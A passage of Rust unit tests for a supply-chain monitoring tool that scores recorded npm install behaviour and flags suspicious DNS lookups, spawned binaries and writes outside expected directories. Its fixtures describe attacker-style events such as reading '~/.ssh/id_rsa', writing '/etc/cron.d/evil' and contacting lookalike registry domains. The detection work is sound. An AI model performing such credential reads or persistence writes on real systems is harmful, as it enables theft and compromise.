        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
    }

    #[test]
    fn a_non_registry_lookup_is_high() {
        let events = stream(Backend::Strace, vec![dns("telemetry.example.com")]);
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["dns_non_registry_host"]);
        assert_eq!(analysis.score.value, 15);
    }

    #[test]
    fn a_binary_distribution_lookup_is_medium() {
        // node-gyp and sharp legitimately do this. Still reported — a package downloading an executable
        // is worth knowing about — but not at the same weight as an unexplained host.
        let events = stream(Backend::Strace, vec![dns("objects.githubusercontent.com")]);
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["dns_binary_distribution_host"]);
        assert_eq!(analysis.score.value, 5);
    }

    #[test]
    fn a_lookalike_registry_domain_is_still_a_finding() {
        // The case the label-boundary check exists for. If `evil-npmjs.org` were treated as registry
        // infrastructure its traffic would silently stop being reported.
        let events = stream(Backend::Strace, vec![dns("registry.evil-npmjs.org")]);
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["dns_non_registry_host"]);
    }

    #[test]
    fn a_single_label_name_is_search_domain_noise() {
        let events = stream(Backend::Strace, vec![dns("wpad")]);
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty());
    }

    // ---- spawns ---------------------------------------------------------------------------------

    #[test]
    fn expected_toolchain_spawns_are_silent() {
        // A native build runs a long tail of compiler helpers. Treating each as suspicious would drown
        // the report.
        let events = stream(
            Backend::Strace,
            vec![
                spawn("/usr/bin/node", &["node", "x.js"], false),
                spawn("/usr/bin/gcc", &["gcc", "-c", "x.c"], false),
                spawn("/usr/bin/make", &["make"], false),
                spawn("/usr/bin/mkdir", &["mkdir", "-p", "build"], false),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
    }

    #[test]
    fn an_unexpected_binary_is_medium() {
        let events = stream(
            Backend::Strace,
            vec![spawn("/opt/weird/tool", &["tool", "--phone-home"], false)],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&analysis), vec!["spawned_unexpected_binary"]);
        assert_eq!(analysis.score.value, 5);
    }

    // ---- coverage integration -------------------------------------------------------------------

    #[test]
    fn an_aya_recording_reports_its_blind_spots() {
        // The Phase 3 obligation from the Option A decision. An aya recording that finds no credential
        // reads must not be read as "no credentials were touched".
        let events = stream(
            Backend::Aya,
            vec![write(
                "/etc/cron.d/evil",
                PathOrigin::Absolute,
                WriteKind::Open,
            )],
        );
        let analysis = evaluate(&catalog(), &events);

        assert_eq!(analysis.coverage.backend, Backend::Aya);
        assert!(!analysis.coverage.is_complete());
        assert!(
            !analysis.clean_result_is_trustworthy(),
            "aya has blind spots, so even a clean score carries a caveat"
        );

        let skipped: Vec<&str> = analysis
            .skipped_rules
            .iter()
            .map(|(id, _)| id.as_str())
            .collect();
        assert!(
            skipped.contains(&"credential_path_read"),
            "the credential rule must be named as not run: {skipped:?}"
        );
        assert!(
            skipped.contains(&"dns_non_registry_host"),
            "the DNS rule must be named as not run: {skipped:?}"
        );
        // The write rule still ran, so the finding is present.
        assert_eq!(rule_ids(&analysis), vec!["write_outside_expected_dirs"]);
    }

    #[test]
    fn a_strace_recording_has_no_skipped_rules() {
        let events = stream(Backend::Strace, vec![dns("registry.npmjs.org")]);
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.skipped_rules.is_empty());
        assert!(analysis.coverage.is_complete());
        assert!(analysis.clean_result_is_trustworthy());
    }

    // ---- completeness ---------------------------------------------------------------------------

    #[test]
    fn a_partial_recording_is_marked_regardless_of_score() {
        // PRD.md:58. A truncated recording that found nothing found nothing *so far*, and a clean score
        // over it is the most dangerous output the product can produce.
        let mut events = stream(Backend::Strace, vec![]);
        let last = events.len() - 1;
        events[last] = Event::framing(
            9_000,
            Backend::Strace,
            Payload::SessionEnd(SessionEnd::partial(
                crate::events::IncompleteReason::Timeout { limit_secs: 120 },
                Vec::new(),
                None,
                1_000,
                0,
                0,
            )),
        );

        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.is_partial());
        assert!(analysis.score.is_clean());
        assert!(
            !analysis.clean_result_is_trustworthy(),
            "a clean score on a PARTIAL recording is not trustworthy"
        );
        assert_eq!(analysis.partial_reasons.len(), 1);
        assert!(analysis.partial_reasons[0].contains("120s"));
    }

    #[test]
    fn a_stream_with_no_session_end_is_partial() {
        // Same refusal as the recorder's own stream summary: a recorder that died without terminating
        // leaves output that looks clean.
        let events = vec![Event::observed(
            meta(Backend::Strace),
            write("/work/project/x", PathOrigin::Kernel, WriteKind::Open),
        )];
        let analysis = evaluate(&catalog(), &events);
        assert!(analysis.is_partial());
        assert!(analysis.partial_reasons[0].contains("no session_end"));
    }

    #[test]
    fn a_stream_with_no_session_start_has_no_zones_and_says_so_loudly() {
        // Missing zones means every resolved path reads as Outside. That is deliberately loud: a missing
        // header should not silently disable the critical rule.
        let events = vec![
            Event::observed(
                meta(Backend::Strace),
                write(
                    "/work/project/index.js",
                    PathOrigin::Kernel,
                    WriteKind::Open,
                ),
            ),
            Event::framing(
                9_000,
                Backend::Strace,
                Payload::SessionEnd(SessionEnd::complete(Some(0), 1, 1, 1)),
            ),
        ];
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(
            rule_ids(&analysis),
            vec!["write_outside_expected_dirs"],
            "an obviously wrong report beats a subtly wrong one"
        );
    }

    // ---- determinism and aggregation -------------------------------------------------------------

    #[test]
    fn the_same_recording_always_produces_the_same_analysis() {
        // PRD.md:60. Two people running this over one recording must get identical findings.
        let events = stream(
            Backend::Strace,
            vec![
                write("/etc/a", PathOrigin::Kernel, WriteKind::Open),
                write("/etc/b", PathOrigin::Kernel, WriteKind::Open),
                dns("telemetry.example.com"),
                spawn("/usr/bin/curl", &["curl", "https://x"], false),
                read("/home/runner/.ssh/id_rsa", Outcome::success()),
            ],
        );
        let first = evaluate(&catalog(), &events);
        let second = evaluate(&catalog(), &events);
        assert_eq!(rule_ids(&first), rule_ids(&second));
        assert_eq!(first.score, second.score);
        assert_eq!(
            first
                .findings
                .iter()
                .map(|f| f.subject.clone())
                .collect::<Vec<_>>(),
            second
                .findings
                .iter()
                .map(|f| f.subject.clone())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn repeated_writes_to_one_path_are_one_finding() {
        // A loop writing a thousand times to one file is one escape. Without deduplication the three
        // bullet slots would show the same path three times.
        let payloads: Vec<Payload> = (0..50)
            .map(|_| write("/etc/cron.d/evil", PathOrigin::Kernel, WriteKind::Write))
            .collect();
        let events = stream(Backend::Strace, payloads);
        let analysis = evaluate(&catalog(), &events);

        assert_eq!(analysis.findings.len(), 1);
        assert_eq!(analysis.findings[0].occurrences, 50);
        assert_eq!(
            analysis.score.value, 40,
            "occurrences do not inflate a score"
        );
    }

    #[test]
    fn findings_are_ordered_most_severe_first() {
        let events = stream(
            Backend::Strace,
            vec![
                spawn("/opt/weird/tool", &["tool"], false),
                write("/etc/cron.d/evil", PathOrigin::Kernel, WriteKind::Open),
                read("/home/runner/.ssh/id_rsa", Outcome::success()),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        let severities: Vec<Severity> = analysis
            .findings
            .iter()
            .map(|finding| finding.severity)
            .collect();
        let mut sorted = severities.clone();
        sorted.sort_unstable();
        assert_eq!(severities, sorted);
        assert_eq!(severities.first(), Some(&Severity::Critical));
    }

    #[test]
    fn a_disabled_rule_produces_no_findings() {
        // The catalog controls whether a rule runs. Disabling must actually disable it, or the toggle is
        // decoration.
        let text = r"
version: 1
registry_hosts: [registry.npmjs.org]
rules:
  - id: write_outside_expected_dirs
    severity: critical
    kind: write_outside_zones
    title: wrote outside
    enabled: false
  - id: keeps_working
    severity: low
    kind: connect_external
    title: connected
";
        let narrow = Catalog::from_yaml(text).expect("valid");
        let events = stream(
            Backend::Strace,
            vec![write(
                "/etc/cron.d/evil",
                PathOrigin::Kernel,
                WriteKind::Open,
            )],
        );
        let analysis = evaluate(&narrow, &events);
        assert!(analysis.findings.is_empty(), "{:?}", analysis.findings);
    }

    #[test]
    fn a_long_command_line_is_truncated_in_the_subject() {
        // One pathological argv must not dominate a report.
        let long = "x".repeat(5_000);
        let truncated = truncate_subject(&long);
        assert!(
            truncated.chars().count() <= 201,
            "got {}",
            truncated.chars().count()
        );
        assert!(truncated.ends_with('…'));
        // A short subject is untouched.
        assert_eq!(truncate_subject("short"), "short");
    }

    #[test]
    fn every_finding_carries_traceable_evidence() {
        // A report that asserts behavior it cannot point at is an opinion. PRD's whole claim is evidence.
        let events = stream(
            Backend::Strace,
            vec![
                write("/etc/cron.d/evil", PathOrigin::Kernel, WriteKind::Open),
                dns("telemetry.example.com"),
                spawn("/usr/bin/curl", &["curl", "https://x"], false),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert!(!analysis.findings.is_empty());
        for finding in &analysis.findings {
            assert!(
                !finding.evidence.is_empty(),
                "`{}` has no evidence",
                finding.rule_id
            );
            for evidence in &finding.evidence {
                assert!(!evidence.op.is_empty());
                assert!(!evidence.detail.is_empty());
            }
            assert!(
                finding.note.is_some(),
                "`{}` should carry the catalog's reasoning",
                finding.rule_id
            );
        }
    }

    #[test]
    fn a_realistic_clean_install_scores_zero() {
        // The most important negative case in the file. If an ordinary install scores above zero, the
        // product is unusable regardless of how good its critical detection is.
        let events = stream(
            Backend::Strace,
            vec![
                dns("registry.npmjs.org"),
                connect("104.16.2.34", Some(443), false),
                connect("104.16.3.34", Some(0), false),
                read("/home/runner/.npmrc", Outcome::success()),
                write(
                    "/work/project/package-lock.json",
                    PathOrigin::Kernel,
                    WriteKind::Write,
                ),
                write(
                    "/work/project/node_modules/lodash/lodash.js",
                    PathOrigin::Kernel,
                    WriteKind::Write,
                ),
                write(
                    "/work/cache/_cacache/content-v2/sha512/ab/cd",
                    PathOrigin::Kernel,
                    WriteKind::Write,
                ),
                write("/tmp/npm-1234", PathOrigin::Kernel, WriteKind::Mkdir),
                spawn("/usr/bin/node", &["node", "install.js"], false),
                spawn("/usr/bin/npm", &["npm", "install"], false),
            ],
        );
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(
            analysis.score.value,
            0,
            "an ordinary install must score zero: {:?}",
            rule_ids(&analysis)
        );
        assert!(analysis.clean_result_is_trustworthy());
        // Informational findings are still present, because silence is a designed state that shows its
        // evidence (Design.md:43).
        assert!(!analysis.findings.is_empty());
        assert!(analysis
            .findings
            .iter()
            .all(|finding| finding.severity == Severity::Low));
    }

    #[test]
    fn an_empty_recording_with_zero_observations_is_not_trustworthy_as_clean() {
        let events = stream(Backend::Strace, Vec::new());
        let analysis = evaluate(&catalog(), &events);
        assert_eq!(analysis.observations, 0);
        assert_eq!(analysis.score.value, 0);
        assert!(
            !analysis.clean_result_is_trustworthy(),
            "a recording with zero observed events cannot be claimed as a trustworthy clean install"
        );
    }
}
